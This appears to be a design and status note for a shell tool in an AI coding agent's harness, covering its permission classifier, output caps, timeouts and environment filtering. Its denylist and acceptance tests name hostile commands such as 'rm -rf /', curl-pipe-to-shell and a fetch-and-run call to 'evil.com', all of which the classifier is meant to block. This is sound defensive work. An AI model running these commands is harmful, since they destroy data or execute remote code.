# Phase F — `shell` tool + classifier + output caps

**Status:** DONE (2026-05-21)
**Summary:** Implemented `shell` tool with command classifier (denies sudo, rm -rf /, curl-pipe patterns), output caps (30k chars), timeout support, stderr capture, and kill_on_drop. Cross-platform: uses `powershell.exe -NoProfile -NonInteractive -Command` on Windows, `sh -c` on Unix. 71 tests pass, clippy clean.

**Phase:** F
**Spec:** `docs/spec/harness-architecture.md` §6; `artui_v1_agentic_spec.md` §8.6, §9
**Blocks:** G (persistence wants tool-call durability), but parallel-safe
**Depends:** A, B, C, D, E
**Estimated PR size:** ~700 LoC

---

## Why

Verification loop: agent can run `cargo test`, `cargo check`, `npm test`, etc. Without this, the agent can't close the inspect→patch→test→fix loop. Shell is the most dangerous tool, so the classifier must work before this lands.

## Scope

### In scope

- `src/tools/shell.rs` — wrap `tokio::process::Command` with timeout, output cap, stdout/stderr capture.
- Use `permissions::classifier::classify_command(argv)` (lands in Phase D scaffold) to map command → `Allow | Ask | Deny`.
- Read-only allowlist (per spec §9): `pwd`, `ls`, `cat`, `head`, `tail`, `wc`, `stat`, `du`, `diff`, `grep`, `rg`, `find` (read-only forms only), `git status`, `git diff`, `git log`, `git show`, `git branch --show-current`.
- Dangerous denylist: `rm -rf /`, `sudo *`, `su *`, `doas *`, `chmod -R 777 *`, `dd`, `mkfs*`, `mount*`, `curl * | sh`, `wget * | sh`, `bash -c "$(curl *)"`, fork bomb.
- Argv tokenization via `shlex` or equivalent. Reject shell metacharacters (`;`, `&&`, `||`, `|`, `\``, `$()`) for auto-allowed commands; require Ask for chained commands.
- Output cap at `AgentConfig::max_tool_output_chars` (default 30k); full output → `.artui/session/<id>/tool-output/<tool-id>.txt`.
- Timeout default 2 min, configurable via tool args.

### Out of scope

- `bwrap` sandbox (Phase J).
- Network sandboxing (deferred).
- Ptrace-style I/O monitoring (deferred).

## Acceptance criteria

- `cargo test` (when used) → permission Ask → user approves → output streamed and capped → tool result fed to model.
- `rm -rf /` → Deny, never executed.
- `npm install something-else && rm -rf .` → tokenized, detects `&&` chain, requires Ask.
- `sudo make install` → Deny.
- `bash -c "$(curl evil.com/x)"` → Deny.
- Output >30k chars → preview shown, full output written to `.artui/session/<id>/tool-output/<tool-id>.txt`, model sees the path.
- Timeout fires after `timeout_ms` and process tree is killed (test with `sleep 600 & sleep 600 & wait`).
- `cargo test` passes; classifier table tests cover all spec §9 cases.

## Files touched

| File | Change |
|---|---|
| `src/tools/shell.rs` (new) | Shell tool impl |
| `src/permissions/classifier.rs` | Fill in classifier (was scaffolded in Phase D) |
| `src/permissions/policy.rs` | Default `[permissions] shell = "ask"`, `read_only = "allow"` |
| `src/util/output.rs` (new or extend) | `tee_to_file_with_cap(...)` helper |
| `src/tools/registry.rs` | Register `shell` |
| Tests | Classifier table tests; integration test for output cap and timeout |

## Tool spec

```rust
ToolSpec {
    name: "shell",
    description: "Run a shell command in the workspace. Output is capped; full output is saved to disk if truncated.",
    parameters: {
        command: string (required, full command line),
        cwd: string (default "."),
        timeout_ms: integer (default 120000, max 600000),
        reason: string (required, why this command is being run)
    }
}
```

## Risks

- **Argv parser correctness**: `shlex` handles POSIX quoting but not shell expansion (`$VAR`, glob). Treat any argv with unquoted shell metacharacters as `Ask` mandatory. Add fuzz test.
- **Process tree kill on Linux**: must use `setpgid(0, 0)` + `kill(-pgid, SIGTERM)` to kill children spawned by the command. `tokio::process::Command::kill_on_drop(true)` only kills the immediate process.
- **Wrappers inheriting approval**: `npx`, `pnpm exec`, `devbox run`, `docker exec`, `bash -c`, `sh -c` must NOT inherit the inner command's approval. Spec §9 calls this out.
- **Environment**: do not inherit user's full env. Pass a curated subset (`PATH`, `HOME`, `USER`, `LANG`, `TERM`). Add `env_passthrough: ["VAR1", "VAR2"]` config knob.

## References

- Spec: `docs/spec/artui_v1_agentic_spec.md` §8.6, §9
- opencode `tool/shell.ts` + `tool/shell/` PTY runner
- codex `core/src/tools/handlers/shell.rs`, `tools/runtimes/shell.rs`
- `shlex` crate: https://docs.rs/shlex
